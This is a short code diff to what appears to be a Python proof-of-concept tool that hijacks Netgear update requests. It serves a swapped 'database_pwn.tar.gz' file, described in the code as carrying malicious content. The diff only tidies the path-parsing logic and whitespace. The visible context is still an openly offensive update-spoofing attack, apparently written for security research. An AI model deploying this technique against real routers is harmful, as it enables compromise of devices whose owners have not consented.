@@ -55,10 +55,7 @@ def udp_callback(pkt):
 class CustomHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         # strip extra params for pattern matching
-        if '?' in self.path:
-            path = self.path[:self.path.find('?')]
-        else:
-            path = self.path
+        path = self.path[:self.path.find('?')] if '?' in self.path else self.path
         if path.endswith('database.tar.gz'):
             # serve our copy of the circleinfo.txt file with the malicious info
             self.path = './database_pwn.tar.gz'
@@ -94,7 +91,7 @@ if __name__ == "__main__":
     sniff_iface = args.interface
     server_ip = args.ip_address
     http_port = 80
-    
+
     # The typical update domains
     update_domains = ['http.updates1.netgear.com']
 
